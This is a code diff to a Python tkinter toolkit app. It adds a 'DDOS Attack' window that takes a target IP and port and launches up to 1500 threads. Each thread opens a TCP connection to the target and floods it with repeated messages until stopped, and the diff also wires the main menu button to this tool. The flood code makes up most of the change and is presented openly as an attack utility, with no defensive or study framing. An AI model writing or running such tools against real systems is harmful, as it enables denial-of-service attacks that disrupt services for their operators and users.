@@ -1,5 +1,7 @@
 import hashlib
 import re
+import socket
+import threading
 import tkinter as tk
 from tkinter import ttk, scrolledtext
 
@@ -435,6 +437,122 @@ class MSSPDecryptionAppGUI(tk.Frame):
         self.result_text.config(state=tk.DISABLED)
 
 
+class DDOSToolGUI(tk.Frame):
+    # Define the IPAddressPortEntry class that inherits from tk.Frame
+    class IPAddressPortEntry(tk.Frame):
+        # Initialize the class
+        def __init__(self, master=None):
+            super().__init__(master)  # Call the constructor of the parent class
+            self.master = master  # Store the master (parent) window reference
+            self.create_widgets()  # Call the create_widgets method to create the UI elements
+
+        # Method to create widgets
+        def create_widgets(self):
+            # Create the first octet entry and place it in the grid
+            self.octet1 = ttk.Entry(self, width=3)
+            self.octet1.grid(row=0, column=0)
+            # Create the second octet entry and place it in the grid
+            self.octet2 = ttk.Entry(self, width=3)
+            self.octet2.grid(row=0, column=2)
+            # Create the third octet entry and place it in the grid
+            self.octet3 = ttk.Entry(self, width=3)
+            self.octet3.grid(row=0, column=4)
+            # Create the fourth octet entry and place it in the grid
+            self.octet4 = ttk.Entry(self, width=3)
+            self.octet4.grid(row=0, column=6)
+            # Create dots as labels to visually separate the octets and place them in the grid
+            self.dot1 = ttk.Label(self, text=".")
+            self.dot1.grid(row=0, column=1)
+            self.dot2 = ttk.Label(self, text=".")
+            self.dot2.grid(row=0, column=3)
+            self.dot3 = ttk.Label(self, text=".")
+            self.dot3.grid(row=0, column=5)
+            # Create colon as a label to visually separate IP and port and place it in the grid
+            self.colon = ttk.Label(self, text=":")
+            self.colon.grid(row=0, column=7)
+            # Create the port entry and place it in the grid
+            self.port = ttk.Entry(self, width=5)
+            self.port.grid(row=0, column=8)
+
+        # Method to get the IP address and port
+        def get(self):
+            # Retrieve the content of each octet entry and port entry
+            oct1 = self.octet1.get()
+            oct2 = self.octet2.get()
+            oct3 = self.octet3.get()
+            oct4 = self.octet4.get()
+            port = self.port.get()
+            # Construct the IP address string
+            ip_address = f"{oct1}.{oct2}.{oct3}.{oct4}"
+            # Return the IP address and port as a tuple
+            return ip_address, port
+
+    def __init__(self, master=None):
+        super().__init__(master)
+        self.stop_button = None
+        self.start_button = None
+        self.button_frame = None
+        self.thread_label = None
+        self.thread_spinbox = None
+        self.ip_label = None
+        self.ip_entry = None
+        self.master = master
+        self.thread_count = 1
+        self.threads = []
+        self.keep_alive = False
+        self.pack()
+        self.create_widgets()
+
+    def create_widgets(self):
+        # IP Address Entry
+        self.ip_label = ttk.Label(self, text="Enter IP address:")
+        self.ip_label.grid(row=0, column=0, padx=5, pady=5)
+        self.ip_entry = self.IPAddressPortEntry(self)
+        self.ip_entry.grid(row=0, column=1, padx=5, pady=5)
+        # Number of Threads Entry
+        self.thread_label = ttk.Label(self, text="Number of Threads (1 to 1500):")
+        self.thread_label.grid(row=2, column=0, padx=5, pady=5)
+        self.thread_spinbox = ttk.Spinbox(self, from_=1, to=1500, increment=1, width=20)
+        self.thread_spinbox.grid(row=2, column=1, padx=5, pady=5)
+        # Start and Stop Buttons
+        self.button_frame = ttk.Frame(self)
+        self.button_frame.grid(row=3, columnspan=2)
+        self.start_button = ttk.Button(self.button_frame, text="Start", command=self.start_operation)
+        self.start_button.pack(side=tk.LEFT, padx=5, pady=10)
+        self.stop_button = ttk.Button(self.button_frame, text="Stop", command=self.stop_operation)
+        self.stop_button.pack(side=tk.LEFT, padx=5, pady=10)
+
+    def attack(self, address, port, message, num_thread):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        addr_port = (address, int(port))
+        sock.connect(addr_port)
+        while self.keep_alive:
+            message = str.encode(message)
+            sock.sendall(message)
+            print(f"Sending {message} to {address}:{port}, thread {num_thread}")
+        sock.close()
+        print(f"Stopped sending {message} to {address}:{port}, thread {num_thread}")
+
+    def start_operation(self):
+        ip_address, port = self.ip_entry.get()
+        num_threads = int(self.thread_spinbox.get())
+        print(f"Starting operation with IP: {ip_address}, Port: {port}, Number of Threads: {num_threads}")
+        msg = "hi"
+        for i in range(num_threads):
+            new_th = threading.Thread(target=self.attack, args=(ip_address, port, msg, i + 1))
+            self.threads.append(new_th)
+        self.keep_alive = True
+        for th in self.threads:
+            th.start()
+
+    def stop_operation(self):
+        print("Stopping operation")
+        self.keep_alive = False
+        for th in self.threads:
+            th.join()
+        print("Stopped")
+
+
 class MainWindow(tk.Tk):
     font_large = ("Arial", 24)
     font_med = ("Arial", 12)
@@ -461,7 +579,6 @@ class MainWindow(tk.Tk):
         """
         function that creates buttons
         """
-        self.font_med = ("Arial", 12)
         self.button_list = []
         self.fakeDataBtn = tk.Button(self, text="Create Random Fake Data",
                                      font=self.font_med,
@@ -545,7 +662,7 @@ class MainWindow(tk.Tk):
         self._open_window("MSSP Decrypt", MSSPDecryptionAppGUI)
 
     def onDdosAttackBtn(self):
-        pass
+        self._open_window("DDOS Attack", DDOSToolGUI)
 
 
 if __name__ == "__main__":
